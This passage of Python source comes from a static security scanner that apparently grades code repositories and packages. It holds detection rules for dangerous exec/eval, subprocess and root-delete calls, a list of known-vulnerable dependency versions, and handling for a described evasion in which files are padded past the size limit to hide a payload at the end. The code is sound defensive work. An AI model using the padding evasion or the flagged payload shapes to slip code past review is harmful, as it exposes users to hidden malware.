    """Is the call at ``lines[idx]`` inside the program's OWN command-line entry point —
    a typer/click command (decorated function, file imports typer/click) or an
    argparse / ``sys.argv`` main? Arguments there come from the person running the CLI,
    not from a remote party (precision PR 2 calibration). A bot framework's
    ``@bot.command`` does not count: the file must import typer, click or argparse."""
    if not has_cli_import or idx >= len(lines):
        return False
    cur = len(lines[idx]) - len(lines[idx].lstrip())
    for n in range(idx - 1, max(-1, idx - 600), -1):
        st = lines[n].lstrip()
        # Blank, comment, and closing-bracket lines (the `) -> None:` that ends a
        # multi-line signature) say nothing about the enclosing block.
        if not st or st.startswith(("#", ")", "]", "}")):
            continue
        ind = len(lines[n]) - len(st)
        if ind >= cur:
            continue
        cur = ind
        if st.startswith(("def ", "async def ")):
            for k in range(n - 1, max(-1, n - 15), -1):
                dst = lines[k].lstrip()
                dind = len(lines[k]) - len(dst)
                if dind == ind and not dst.startswith(("@", ")")):
                    break
                if _CLI_DECORATOR_RE.match(lines[k]):
                    return True
            return any(_CLI_ARGS_RE.search(ln) for ln in lines[n: idx + 1])
        if st.startswith("if __name__"):
            return any(_CLI_ARGS_RE.search(ln) for ln in lines)
        if ind == 0 and not st.startswith(("class ", "try", "with ", "for ", "if ", "else",
                                            "elif ", "except", "finally")):
            return False
    return False


# Decorators that make a function's PARAMETERS come from a remote party: a web route, a
# chat-bot command, an agent / MCP tool, an event handler. (A click / typer command is
# the program's own CLI, see `_cli_origin`; this rule never applies in such a file.)
_REMOTE_HANDLER_DECORATOR_RE = re.compile(
    r"^\s*@(?:[\w.]+\.)?(?:route|get|post|put|patch|delete|websocket|command|tool|call_tool|"
    r"event|listen|listener|message_handler|on_message|handler|task|slash_command|"
    r"hybrid_command|app_command)\b"
    r"|^\s*@(?:tool|mcp_tool|function_tool)\b",
)
_PY_PARAM_RE = re.compile(r"(?:^|,|\()\s*\*{0,2}([A-Za-z_]\w*)\s*(?=[:=,)])")


def _remote_handler_params(lines: list[str], idx: int, has_cli_import: bool) -> set[str]:
    """Parameters of the function enclosing ``lines[idx]`` when it is a remote-entry
    handler (see above), else empty. Precision PR 2: with the shell ladder, such a
    parameter reaching a command is "untrusted input in reach" (high)."""
    if has_cli_import or idx >= len(lines):
        return set()
    cur = len(lines[idx]) - len(lines[idx].lstrip())
    for n in range(idx - 1, max(-1, idx - 400), -1):
        st = lines[n].lstrip()
        if not st or st.startswith(("#", ")", "]", "}")):
            continue
        ind = len(lines[n]) - len(st)
        if ind >= cur:
            continue
        cur = ind
        if not st.startswith(("def ", "async def ")):
            if ind == 0:
                return set()
            continue
        decorated = False
        for k in range(n - 1, max(-1, n - 15), -1):
            dst = lines[k].lstrip()
            if not dst.startswith("@") and not dst.startswith(")"):
                if dst and len(lines[k]) - len(dst) <= ind:
                    break
                continue
            if _REMOTE_HANDLER_DECORATOR_RE.match(lines[k]):
                decorated = True
                break
        if not decorated:
            return set()
        sig = " ".join(lines[n: min(len(lines), n + 10)])
        open_i = sig.find("(")
        close_i = sig.find(")", open_i)
        params = {m.group(1) for m in _PY_PARAM_RE.finditer(sig[open_i: close_i + 1])}
        return params - {"self", "cls", "ctx", "context", "interaction", "request", "req"}
    return set()


def _in_py_string_literal(line: str, pos: int) -> bool:
    """Is ``line[pos]`` inside a single-line ``'…'`` / ``"…"`` literal? (A matched
    ``shell=True`` inside an error message is text, not a keyword argument.)"""
    q: str | None = None
    i = 0
    while i < pos:
        ch = line[i]
        if q is not None:
            if ch == "\\":
                i += 2
                continue
            if ch == q:
                q = None
        elif ch == "#":
            return True  # trailing comment
        elif ch in "'\"":
            q = ch
        i += 1
    return q is not None


_JS_METHOD_DEF_PREFIX_RE = re.compile(
    r"^\s*(?:(?:async|static|public|private|protected|export|override)\s+)*\*?\s*$")
_JS_METHOD_DEF_RE = re.compile(
    r"[\w$]+\s*\([^()]*\)\s*(?::\s*[\w$<>\[\]|,. ]+)?\s*\{")


def _js_call_is_text_or_def(line: str, pos: int, start_in: str | None = None) -> bool:
    """Is the exec-family name at ``line[pos]`` NOT a call: inside a string literal or a
    comment on this line, or the name of a definition (`function execSync(cmd) {`, a
    class method `exec(cmd, opts) {`)? ``start_in`` seeds the state for a line that
    begins inside a template literal opened earlier. Precision PR 2."""
    in_str: str | None = start_in
    escape = False
    i = 0
    while i < pos:
        ch = line[i]
        if in_str is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == in_str:
                in_str = None
            elif in_str == "`" and line.startswith("${", i):
                return False  # code inside a template expression
            i += 1
            continue
        if line.startswith("//", i):
            return True
        if line.startswith("/*", i):
            end = line.find("*/", i + 2)
            if end == -1 or end >= pos:
                return True
            i = end + 2
            continue
        if ch in "'\"`":
            in_str = ch
        i += 1
    if in_str is not None:
        return True
    head = line[:pos]
    if re.search(r"\bfunction\s*\*?\s*$", head):
        return True
    return bool(_JS_METHOD_DEF_PREFIX_RE.match(head) and _JS_METHOD_DEF_RE.match(line, pos))


def _classify_exec_match(
    lines: list[str], idx: int, match: re.Match, file_lang: str | None,
    untrusted: list[int], has_cli_import: bool = False, js_cli=None,
):
    """Run the exec classifier for a matched subprocess/os.system/child_process call."""
    from src.scanner.exec_classify import (
        classify_js_exec,
        classify_python_exec,
        extract_call,
    )

    near = _near(untrusted, idx, _UNTRUSTED_WINDOW)
    lang = "python" if file_lang == "python" else "js"
    # JS: start at the function name, so `require('child_process').spawn(...)` yields
    # spawn's argument list, not require's.
    start = match.start() if lang == "python" else match.start(1)
    got = extract_call(lines, idx, start, lang=lang)
    call_src, consumed = (got if got else (lines[idx][start:], 1))
    flow = near and _untrusted_flows(lines, idx, call_src, untrusted)
    payload = _decoded_flows(lines, idx, call_src) or _text_decode_flows(lines, idx, call_src)
    if lang == "python" and not near:
        # A remote handler's own parameter (web route, chat-bot command, agent tool)
        # reaching the call is untrusted input in reach (precision PR 2).
        params = _remote_handler_params(lines, idx, has_cli_import)
        near = any(_uses_name(call_src, p) for p in params)
    if lang == "python":
        func = next(g for g in match.groups() if g)
        return classify_python_exec(
            call_src, func, untrusted_near=near, consumed=consumed,
            resolve_name=lambda nm: _resolve_py_assignment(lines, idx, nm),
            cli_origin=_cli_origin(lines, idx, has_cli_import), untrusted_flow=flow,
            payload_flow=payload,
        )
    return classify_js_exec(call_src, match.group(1), untrusted_near=near, consumed=consumed,
                            untrusted_flow=flow, is_cli_expr=js_cli, payload_flow=payload,
                            resolve_name=lambda nm: _resolve_js_assignment(lines, idx, nm))


def _classify_eval_match(lines: list[str], idx: int, match: re.Match, untrusted: list[int]):
    """eval()/exec() (Python): constant → capability; decoded payload → defect high;
    variable → capability unless untrusted input is nearby (then the original high)."""
    import ast as _ast

    from src.scanner.exec_classify import (
        CAP_EVAL,
        ExecVerdict,
        _const_str,
        _parse_expr,
        extract_call,
        inline_code_is_payload,
    )

    got = extract_call(lines, idx, match.start(), lang="python")
    call_src, consumed = (got if got else (lines[idx][match.start():], 1))
    near = _near(untrusted, idx, _UNTRUSTED_WINDOW)
    if DECODE_SINK_RE.search(call_src):
        # The one-line decoded-payload shape is the OBFUSCATION rule's finding
        # ("Decoded payload fed to exec/eval"); don't report the same line twice.
        if _DECODED_EXEC_LINE_RE.search(lines[idx]):
            return None
        return ExecVerdict("defect", "high", "exec/eval of a decoded payload", "", consumed,
                           payload=True)
    node = _parse_expr(call_src)
    if isinstance(node, _ast.Call) and node.args:
        s = _const_str(node.args[0])
        if s is not None:
            # Precision PR 2: a constant whose only "danger" is that it execs/evals a
            # NAME is a compatibility shim (six's `exec_`, future's `exec_`, py's
            # `exec_=exec`): `exec("exec _code_ in _globs_, _locs_")` runs whatever the
            # caller passes, exactly like `exec(code)`. Judge it as dynamic evaluation.
            # A constant that decodes / fetches / imports / spawns stays high.
            if INLINE_CODE_DANGER_RE.search(_SHIM_EXEC_WORD_RE.sub(" ", s)):
                return ExecVerdict("defect", "high",
                                   "constant code string that execs/decodes/fetches", "",
                                   consumed, payload=inline_code_is_payload(s))
            if not _SHIM_EXEC_WORD_RE.search(s):
                return ExecVerdict("capability", "info", "evaluates a constant code string",
                                   CAP_EVAL, consumed)
    if near:
        # Flow, not proximity (precision PR 2): high only when the untrusted value
        # reaches the evaluated expression; an unrelated fetch in the same file is a
        # medium.
        if _untrusted_flows(lines, idx, call_src, untrusted):
            return ExecVerdict("defect", "high", "dynamic code evaluation of untrusted input",
                               "", consumed, payload=True)
        return ExecVerdict("defect", "medium", "dynamic code evaluation in a file that reads "
                           "untrusted input (no flow to the call found)", "", consumed)
    return ExecVerdict("capability", "low",
                       "evaluates code built at runtime (no untrusted input in reach)",
                       CAP_EVAL, consumed)


# The exec/eval/compile words a compatibility shim's constant code may contain.
_SHIM_EXEC_WORD_RE = re.compile(r"\b(?:exec|eval|compile)\b")


def _classify_vm_match(lines: list[str], idx: int, match: re.Match,
                       untrusted: list[int]) -> tuple[str, str, str]:
    """``(kind, severity, label)`` for a Node ``vm.runInContext`` /
    ``runInNewContext`` / ``compileFunction`` call: the eval rule's ladder."""
    from src.scanner.exec_classify import (
        _js_literal,
        extract_call,
        split_top_level_args,
    )

    got = extract_call(lines, idx, match.start(), lang="js")
    call_src = got[0] if got else lines[idx][match.start():]
    open_i, close_i = call_src.find("("), call_src.rfind(")")
    inner = call_src[open_i + 1: close_i] if 0 <= open_i < close_i else ""
    args = split_top_level_args(inner)
    first = args[0] if args else ""
    if _js_literal(first) is not None:
        if INLINE_CODE_DANGER_RE.search(_js_literal(first) or ""):
            return "defect", "high", "runs a constant script that execs/decodes/fetches"
        return "capability", "info", "runs a constant script in a VM context"
    if _is_decode_line(first) or _decoded_flows(lines, idx, call_src):
        return "defect", "high", "runs a decoded payload in a VM context"
    if _near(untrusted, idx, _UNTRUSTED_WINDOW):
        if _untrusted_flows(lines, idx, call_src, untrusted):
            return "defect", "high", "runs untrusted input as code in a VM context"
        return ("defect", "medium", "runs code in a VM context in a file that reads untrusted "
                "input (no flow to the call found)")
    return "capability", "low", "runs code built at runtime in a VM context (no untrusted " \
        "input in reach)"


def _rmtree_is_dangerous(lines: list[str], idx: int, match: re.Match) -> bool:
    """A recursive delete is a defect only when its first argument is a literal root /
    home path; `rmtree(build_dir)` is a capability."""
    from src.scanner.exec_classify import extract_call, split_top_level_args

    got = extract_call(lines, idx, match.start(), lang="python")
    call_src = got[0] if got else lines[idx][match.start():]
    open_i, close_i = call_src.find("("), call_src.rfind(")")
    inner = call_src[open_i + 1: close_i] if 0 <= open_i < close_i else call_src[open_i + 1:]
    args = split_top_level_args(inner)
    if not args:
        return False
    first = args[0].strip().strip("\"'`")
    return bool(DANGEROUS_DELETE_ROOT_RE.search(first))
_SAFE_OPEN_PATTERNS = [
    # Path(...).open() or Path(...).read_text() / write_text()
    re.compile(r"Path\s*\(.*\)\s*\.(?:open|read_text|write_text|read_bytes|write_bytes)\s*\("),
    # open() with a hardcoded string path (no variable interpolation)
    re.compile(r"""open\s*\(\s*['"][^'"{}$]+['"]\s*[,)]"""),
    # with open(..., hardcoded path) as f — context manager with string literal path
    re.compile(r"""with\s+open\s*\(\s*['"][^'"{}$]+['"]"""),
]

# Config file extensions — reading these is almost always legitimate
_CONFIG_FILE_EXTENSIONS = frozenset({
    ".json", ".yml", ".yaml", ".toml", ".cfg", ".ini", ".conf",
    ".xml", ".properties", ".env.example", ".env.template",
})

# Safe write destinations — writing to these directories is expected behavior
_SAFE_WRITE_DIRS = frozenset({
    "logs", "log", "tmp", "temp", ".cache", "cache", "__pycache__",
    ".tmp", "output", "out", "build", "dist", ".build",
})

# Regex: open() reading a config file by extension
_CONFIG_FILE_READ_RE = re.compile(
    r"""open\s*\([^)]*['"][\w./\\-]+\.(?:json|ya?ml|toml|cfg|ini|conf|xml|properties)['"]""",
)

# Regex: writing to a known safe directory (logs/, tmp/, .cache/, etc.)
_SAFE_WRITE_DIR_RE = re.compile(
    r"""open\s*\([^)]*['"](/?(?:[\w.-]+/)*(?:logs?|tmp|temp|\.cache|cache|output|out|build|dist)/[^'"]+)['"]""",
)

# Regex: safe exec/eval — e.g. ast.literal_eval, json.loads with exec in name
_SAFE_EVAL_RE = re.compile(
    r"""(?:ast\.literal_eval|json\.loads?|yaml\.safe_load)\s*\(""",
)

# Regex: safe DB execute — db.execute(), session.execute(), conn.execute(), etc.
_SAFE_DB_EXEC_RE = re.compile(
    r"""(?:await\s+)?(?:\w+\.)?(?:db|session|conn(?:ection)?|cursor|engine|tx|transaction)\.exec(?:ute|utescalar|utemany)\s*\(""",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Known vulnerable dependency patterns (major CVEs / critical issues)
# Each: (package_name_pattern, vulnerable_version_pattern, severity, description)
# ---------------------------------------------------------------------------
# Version-operator shorthand for the vuln rules. Matches only CEILING/EXACT
# constraints (`==` `=` `<` `<=` `~=`) that actually pin a package INTO a vulnerable
# range — never a FLOOR (`>=` `>`), which permits a patched higher version and so is
# not, by itself, evidence of a vulnerable install. (`pyyaml>=5.3.1` allows safe 6.x —
# it was wrongly flagged as the `<6.0` critical on typer/fastapi.)
_VER = r"\s*(?:==|<=?|~=|=)\s*['\"]?"

_VULN_DEPS: list[tuple[str, re.Pattern[str], str, str]] = [
    # -- Python packages --
    (
        "requests",
        re.compile(r"requests" + _VER + r"2\.\d{1,2}\b"),
        "high",
        "requests <2.31.0 leaks Proxy-Authorization header",
    ),
    (
        "urllib3",
        re.compile(r"urllib3" + _VER + r"1\.2[0-5]\b"),
        "high",
        "urllib3 <1.26.18 cookie/header leak",
    ),
    (
        "cryptography",
        re.compile(
            r"cryptography" + _VER
            + r"(3\d*\.|[012]\.|40\.|41\.0\.[012]\b)",
        ),
        "critical",
        "cryptography <41.0.3 OpenSSL vulnerabilities",
    ),
    (
        "pyjwt",
        re.compile(r"[Pp]y[Jj][Ww][Tt]" + _VER + r"[01]\."),
        "high",
        "PyJWT <2.0 algorithm confusion vulnerability",
    ),
    (
        "django",
        re.compile(r"[Dd]jango" + _VER + r"[0-3]\."),
        "critical",
        "Django <4.0 EOL with unpatched CVEs",
    ),
    (
        "flask",
        re.compile(r"[Ff]lask" + _VER + r"[01]\."),
        "high",
        "Flask <2.0 missing security fixes",
    ),
    (
        "pillow",
        re.compile(
            r"[Pp]illow" + _VER + r"(9\.[0-4]\.|[0-8]\.)",
        ),
        "high",
        "Pillow <9.5.0 buffer overflow CVEs",
    ),
    (
        "setuptools",
        re.compile(
            r"setuptools" + _VER + r"(6[0-4]\.|[0-5]\d?\.)",
        ),
        "medium",
        "setuptools <65.5.1 CVE-2022-40897 ReDoS",
    ),
    (
        "certifi",
        re.compile(r"certifi" + _VER + r"202[0-2]\."),
        "high",
        "certifi <2023.07.22 revoked e-Tugra root cert",
    ),
    (
        "aiohttp",
        re.compile(r"aiohttp" + _VER + r"3\.[0-8]\."),
        "high",
        "aiohttp <3.9.0 HTTP request smuggling CVEs",
    ),
    (
        "jinja2",
        re.compile(r"[Jj]inja2" + _VER + r"[0-2]\."),
        "high",
        "Jinja2 <3.0 sandbox escape vulnerabilities",
    ),
    (
        "sqlalchemy",
        re.compile(
            r"[Ss][Qq][Ll][Aa]lchemy" + _VER + r"1\.[0-3]\.",
        ),
        "medium",
        "SQLAlchemy <1.4 SQL injection edge cases",
    ),
    (
        "lxml",
        re.compile(r"lxml" + _VER + r"4\.[0-8]\."),
        "high",
        "lxml <4.9.1 CVE-2022-2309",
    ),
    (
        "paramiko",
        re.compile(r"paramiko" + _VER + r"[0-2]\."),
        "high",
        "paramiko <3.0 auth bypass / RCE vulnerabilities",
    ),
    (
        "pyyaml",
        re.compile(
            r"[Pp][Yy][Yy][Aa][Mm][Ll]" + _VER + r"[0-5]\.",
        ),
        "critical",
        "PyYAML <6.0 unsafe YAML deserialization",
    ),
    # -- Node.js packages --
    (
        "jsonwebtoken",
        re.compile(r'"jsonwebtoken"\s*:\s*"[\^~]?[0-7]\.'),
        "high",
        "jsonwebtoken <8.5.1 algorithm confusion",
    ),
    (
        "lodash",
        re.compile(r'"lodash"\s*:\s*"[\^~]?[0-3]\.'),
        "high",
        "lodash <4.17.21 prototype pollution",
    ),
    (
        "express",
        re.compile(r'"express"\s*:\s*"[\^~]?[0-3]\.'),
        "medium",
        "express <4.x EOL, missing security patches",
    ),
    (
        "axios",
        re.compile(r'"axios"\s*:\s*"[\^~]?0\.'),
        "medium",
        "axios 0.x SSRF and ReDoS vulnerabilities",
    ),
    (
        "node-fetch",
        re.compile(r'"node-fetch"\s*:\s*"[\^~]?[01]\.'),
        "medium",
        "node-fetch <2.6.7 CVE-2022-0235",
    ),
    (
        "minimist",
        re.compile(r'"minimist"\s*:\s*"[\^~]?[01]\.[0-1]\.'),
        "high",
        "minimist <1.2.6 prototype pollution",
    ),
    (
        "tar",
        re.compile(r'"tar"\s*:\s*"[\^~]?[0-5]\.'),
        "high",
        "tar <6.1.9 arbitrary file creation",
    ),
    (
        "got",
        re.compile(r'"got"\s*:\s*"[\^~]?[0-9]\.'),
        "medium",
        "got <11.8.5 open redirect vulnerability",
    ),
    (
        "shell-quote",
        re.compile(r'"shell-quote"\s*:\s*"[\^~]?1\.[0-6]\.'),
        "critical",
        "shell-quote <1.7.3 command injection",
    ),
    (
        "passport",
        re.compile(r'"passport"\s*:\s*"[\^~]?0\.[0-5]\.'),
        "high",
        "passport <0.6.0 session fixation",
    ),
]

# Dependency file names we parse
_DEP_FILES = frozenset({
    "requirements.txt", "pyproject.toml", "setup.py", "setup.cfg",
    "Pipfile", "package.json", "Cargo.toml", "Gemfile",
})


def _is_test_or_doc_file(file_path: str) -> bool:
    """Check if a file is a test, doc, or example file (lower severity)."""
    lower = file_path.lower()
    parts = Path(file_path).parts
    # Test directories and files
    if any(p in ("tests", "test", "spec", "__tests__", "testing") for p in parts):
        return True
    name = Path(file_path).stem.lower()
    if name.startswith("test_") or name.endswith("_test") or name.endswith("_spec"):
        return True
    if name == "conftest":
        return True
    # Co-located test/spec files that sit NEXT TO source (not under a tests/ dir):
    # foo.test.ts, foo.spec.js, Bar.test.tsx, foo_test.go's dotless form is handled
    # above. The stem check misses these because Path.stem keeps the ".test" infix.
    fname = Path(file_path).name.lower()
    if ".test." in fname or ".spec." in fname:
        return True
    # Doc / example / tutorial directories (docs_src, tutorials, cookbook, snippets…)
    if any(p in ("docs", "doc", "docs_src", "examples", "example", "samples", "sample",
                 "tutorial", "tutorials", "cookbook", "snippet", "snippets",
                 "guide", "guides", "recipes") for p in parts):
        return True
    # Tutorial/example files by name (tutorial001.py, example_client.ts, demo_app.py)
    if name.startswith(("tutorial", "example", "demo", "sample")):
        return True
    # Config examples
    if ".example" in lower or ".sample" in lower or ".template" in lower:
        return True
    return False


def _finding_is_blocking(f: object) -> bool:
    """Whether a finding should drive the HEADLINE grade/tier/number (not just the
    letter). True when it's in shipped/runtime code, OR known-malicious wherever it
    sits (a MAL finding is dangerous even under tests/). A finding with no known path
    is treated as blocking (conservative — an unlocated critical isn't waved through).
    Keeps the score, tier, grade, and headline count in agreement about one critical.
    """
    name = (getattr(f, "name", "") or "")
    if name.startswith("Known-malicious") or "malicious" in name.lower():
        return True
    # A capability (what the tool does, reported for visibility) never blocks, and
    # neither does a finding in a file the consumer never installs (sdist-only
    # Makefile / scripts/ / bench/, anything absent from the wheel).
    if not _is_defect(f) or not getattr(f, "installed", True):
        return False
    # An install hook is the package's OWN code running at install time (npm
    # lifecycle script, setup.py) — a critical/high there (fetch, pipe-to-shell,
    # eval, node -e) is the supply-chain entry point and must floor the score, even
    # though its deduction is still the bounded dependency penalty.
    if getattr(f, "category", "") == "install_hook":
        return getattr(f, "severity", "") in ("critical", "high")
    # Dependency/supply-chain vulns do NOT hard-block: a CVE in a dependency (often
    # transitive, unreachable, or severity-inflated) shouldn't floor a reputable tool to
    # the Minimal tier the way a first-party code RCE does. They flow through the separate,
    # bounded, reachability-weighted _dependency_penalty (and a known-malicious dep still
    # short-circuits above / via _DEP_MAL_PENALTY). Only FIRST-PARTY shipped code blocks.
    if getattr(f, "category", "") in _DEP_CATEGORIES:
        return False
    # A payload-shaped defect blocks wherever it sits in the artifact (see Finding.payload).
    # Blocking uses a TIGHTER exemption than the finding-weight discount: a real
    # critical in a runtime-plausible dir an author could rename into (scripts/,
    # tooling/, sandbox/, playground/, site/, a `demo_server.py` at root) still
    # floors the score. Only genuinely-non-runtime code (tests/fixtures/docs/
    # examples/benchmarks, co-located test files) is exempt from the floor — that
    # noise is still weight-discounted elsewhere, it just can't hide a real critical.
    # The location rule IS the public ``shipped`` tag (one definition, so the page and
    # the answer agree).
    return finding_is_shipped(f)


# Dirs that are truly never the runtime surface an agent connects to. STRICTER than
# _NON_PROD_DIR_MARKERS: it drops scripts/tooling/release/site/website/playground/
# sandbox/demo(s) — an author can ship the real entry point there, so a critical in
# them must still block. Used ONLY for the blocking/floor decision.
_BLOCKING_EXEMPT_DIRS = frozenset({
    "example", "examples", "sample", "samples",
    "test", "tests", "__tests__", "e2e", "integration", "fixture", "fixtures", "spec",
    "benchmark", "benchmarks", "bench", "benches", "docs", "doc",
})


def _is_blocking_exempt_path(path: str) -> bool:
    """True if a finding here should NOT drive the critical/high floor — only true
    non-runtime code (test/fixture/docs/example dirs, or a co-located test/spec file).
    Deliberately does NOT honor the demo/sample/example FILENAME-prefix or scripts/
    tooling/sandbox dirs, which are author-controlled floor-dodges."""
    parts = [p.lower() for p in Path(path).parts[:-1]]
    if any(p in _BLOCKING_EXEMPT_DIRS for p in parts):
        return True
    fname = Path(path).name.lower()
    stem = Path(path).stem.lower()
    if ".test." in fname or ".spec." in fname:
        return True
    if stem.startswith("test_") or stem.endswith(("_test", "_spec")) or stem == "conftest":
        return True
    return False


def _blocking_crit_count(result: object) -> int:
    """Blocking-critical count, tolerant of lightweight fakes (fall back to raw)."""
    v = getattr(result, "shipped_critical_count", None)
    return getattr(result, "critical_count", 0) if v is None else v


def _blocking_high_count(result: object) -> int:
    v = getattr(result, "shipped_high_count", None)
    return getattr(result, "high_count", 0) if v is None else v


def _select_scan_files(
    tree: list[dict], user_excludes: set[str] | None = None,
) -> tuple[list[dict], int, bool]:
    """Filter a file tree to the scannable set, cap at ``_MAX_FILES_PER_REPO``, and
    order a big monorepo so the sample favors shipped source over test/vendored files.

    Returns ``(scan_files, total_scannable, sampled)``. Shared by ``scan_repo``
    (hosted, GitHub tree) and ``local_scan.scan_local`` (offline, git-tracked tree)
    so the two paths select the SAME files — file selection can't drift between them.
    """
    excl = {e.lower() for e in (user_excludes or set())}

    def _excluded(path: str) -> bool:
        low = path.lower()
        return any(e in low for e in excl)

    scannable = [
        it for it in tree
        if not _should_skip_path(it["path"])
        and it.get("size", 0) <= _MAX_FILE_SIZE
        and (_is_source_file(it["path"]) or _is_git_config_file(it["path"])
             or _is_git_hook_file(it["path"]))
        and not _excluded(it["path"])
    ]
    total = len(scannable)
    sampled = total > _MAX_FILES_PER_REPO
    if total > _MAX_FILES_PER_REPO:
        # Grade the shipped surface first, not the test/example/vendored tree, so a
        # 200-file sample of a monorepo is representative of what an agent runs.
        scannable.sort(key=lambda it: (
            _is_nonshipped_path(it["path"]) or _is_test_or_doc_file(it["path"]),
            it["path"].count("/"),
            it["path"],
        ))
    return scannable[:_MAX_FILES_PER_REPO], total, sampled


# Source files over ``_MAX_FILE_SIZE`` are not skipped silently: padding a file past a
# scanner's size cap with filler, then putting the payload at the end, is a published
# evasion (Pluto Security, "Malicious MCP servers, clean scans", 2026-09-15: 16.2 MiB of
# weather text before the payload). The first and last ``_OVERSIZED_WINDOW`` bytes are
# scanned and the file is disclosed as only partly read.
_OVERSIZED_WINDOW = 256_000
_MAX_OVERSIZED_FILES = 10
# Closers of a multi-line string or comment. A tail window that begins inside the
# filler docstring sees the closing quote as an OPENING one and would treat the code
# after it as prose, so the text after the last closer is scanned on its own too.
_TAIL_CLOSERS = ('"""', "'''", "*/")


def _oversized_scan_files(
    tree: list[dict], user_excludes: set[str] | None = None, *, limit: int | None = None,
) -> list[dict]:
    """Source files in ``tree`` over ``_MAX_FILE_SIZE`` that ``_select_scan_files``
    leaves out, shipped paths first, at most ``limit`` (default ``_MAX_OVERSIZED_FILES``;
    ``0`` = all, for counting the coverage gap)."""
    excl = {e.lower() for e in (user_excludes or set())}
    big = [
        it for it in tree
        if it.get("size", 0) > _MAX_FILE_SIZE
        and not _should_skip_path(it["path"])
        and _is_oversized_code_file(it["path"])
        and not any(e in it["path"].lower() for e in excl)
    ]
    big.sort(key=lambda it: (
        _is_nonshipped_path(it["path"]) or _is_test_or_doc_file(it["path"]), it["path"],
    ))
    if limit == 0:
        return big
    return big[:_MAX_OVERSIZED_FILES if limit is None else limit]


def _is_oversized_code_file(path: str) -> bool:
    """Code an interpreter runs (``_PAYLOAD_CODE_EXTS``). Oversized data files (a 1.2 MB
    endpoints.json, a type table) can't hide a call, so they stay out of this pass."""
    return Path(path).suffix.lower() in _PAYLOAD_CODE_EXTS and _is_source_file(path)


def _looks_padded(head: str, file_path: str) -> bool:
    """Whether the head of an oversized file is filler: one long line repeated over a
    third of the rows, or (in Python) almost all docstring / multi-line string."""
    from collections import Counter
    rows = [ln.strip() for ln in head.split("\n") if ln.strip()]
    if len(rows) < 200:
        return False
    line, n = Counter(r for r in rows if len(r) >= 30).most_common(1)[0] if any(
        len(r) >= 30 for r in rows) else ("", 0)
    if line and n / len(rows) >= 0.3:
        return True
    if Path(file_path).suffix.lower() == ".py":
        total = head.count("\n") + 1
        return len(_python_prose_lines(head)) / total >= 0.9
    return False


def _scan_oversized_text(
    head: str | None, tail: str | None, file_path: str, size: int,
    allowlist: set[tuple[str, str]] | None = None, *, payloads_full_severity: bool = False,
) -> list[Finding]:
    """Findings for a source file too large to scan whole: the static engine over its
    first and last ``_OVERSIZED_WINDOW`` bytes (``None`` = not readable), plus one
    disclosure finding. A tail finding's line number is unknown and reported as 0."""
    windows: list[tuple[str, bool]] = []
    if head:
        cut = head.rfind("\n")
        windows.append((head[:cut + 1] if cut > 0 else head, True))
    if tail:
        cut = tail.find("\n")
        body = tail[cut + 1:] if 0 <= cut < len(tail) - 1 else tail
        windows.append((body, False))
        last = max((body.rfind(t) + len(t) for t in _TAIL_CLOSERS if t in body), default=-1)
        if 0 < last < len(body):
            windows.append((body[last:], False))
    out: list[Finding] = []
    seen: set[tuple[str, str]] = set()
    for text, is_head in windows:
        try:
            found, _pos, _sup = _scan_content(
                text, file_path, allowlist, payloads_full_severity=payloads_full_severity)
        except Exception:  # noqa: BLE001 — a window that fails to scan is just unread
            continue
        for f in found:
            key = (f.name, f.snippet)
            if key in seen:
                continue
            seen.add(key)
            if not is_head:
                f.line_number = 0
            out.append(f)
    padded = bool(head) and _looks_padded(head, file_path)
    read = ("first and last 256 KB scanned" if head and tail
            else "first 256 KB scanned" if head else "not read")
    out.append(Finding(
        category="obfuscation",
        name=("Oversized source file padded with filler" if padded
              else "Source file too large to scan in full"),
        # Padded, or not read at all: medium. Head and tail read, no filler: low.
        severity="medium" if padded or not (head or tail) else "low",
        file_path=file_path,
        line_number=0,
        snippet=f"{size:,} bytes; {read}",
        remediation=_why(
            "a source file this large is only partly scanned; padding past a scanner's "
            "size limit hides code", "obfuscation", "defect"),
    ))
    return out


async def _fetch_file_window(
    owner: str, repo: str, path: str, ref: str | None, *, tail: bool,
) -> str | None:
    """The first (``tail=False``) or last ``_OVERSIZED_WINDOW`` bytes of a repo file over
    the unmetered raw host, by HTTP Range. None without a ref or on any failure (a
    private repo 404s there); the caller then discloses the file as not read."""
    if not ref:
        return None
    rng = f"bytes=-{_OVERSIZED_WINDOW}" if tail else f"bytes=0-{_OVERSIZED_WINDOW - 1}"
    url = f"https://raw.githubusercontent.com/{owner}/{repo}/{ref}/{path}"
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
            resp = await client.get(url, headers={"Range": rng})
    except httpx.HTTPError:
        return None
    if resp.status_code not in (200, 206):
        return None
    data = resp.content
    if resp.status_code == 200:  # Range ignored: keep the window we asked for
        data = data[-_OVERSIZED_WINDOW:] if tail else data[:_OVERSIZED_WINDOW]
    return data.decode("utf-8", errors="replace")


# Developer/build tooling that is NEVER part of an installed package: `pip install`
# never runs a Makefile, tox.ini, noxfile.py or .pre-commit-config.yaml, and `bench/`
# / `_cffi_src/` (cffi build inputs compiled into the wheel) ship nothing. Used both
# for repo-scan downgrading (_is_infra_file) and the artifact `installed` gate.
_BUILD_TOOLING_NAMES = frozenset({
    "makefile", "gnumakefile", "tox.ini", "noxfile.py", "justfile",
    ".pre-commit-config.yaml", ".pre-commit-config.yml", "manifest.in",
})
_BUILD_TOOLING_DIRS = frozenset({"bench", "benches", "benchmark", "benchmarks", "_cffi_src"})


def _is_build_tooling_file(file_path: str) -> bool:
    """True for build/dev tooling a consumer never installs or runs (see above)."""
    lname = Path(file_path).name.lower()
    if lname in _BUILD_TOOLING_NAMES:
        return True
    parts = [p.lower() for p in Path(file_path).parts[:-1]]
    return any(p in _BUILD_TOOLING_DIRS for p in parts)


# Repo infrastructure a consumer never builds or runs: the project's own CI/release
# machines (`infra/`, `ci/`, `*-runner/` bootstrap scripts, `scripts/release*`) and the
# CI-config dirs. Limited to script/config files so an author can't park importable
# source (.py/.js/.rs …) under `infra/` to dodge the floor.
_CI_CONFIG_DIRS = frozenset({".github", ".gitlab", ".circleci", ".buildkite"})
_INFRA_DIRS = frozenset({"infra", "ci", ".ci"})
_SCRIPT_CONFIG_EXTS = frozenset({
    ".sh", ".bash", ".zsh", ".ps1", ".bat", ".cmd",
    ".yml", ".yaml", ".tf", ".tfvars", ".hcl", ".toml", ".json", ".cfg", ".conf", ".ini",
})


def _is_script_or_config(file_path: str) -> bool:
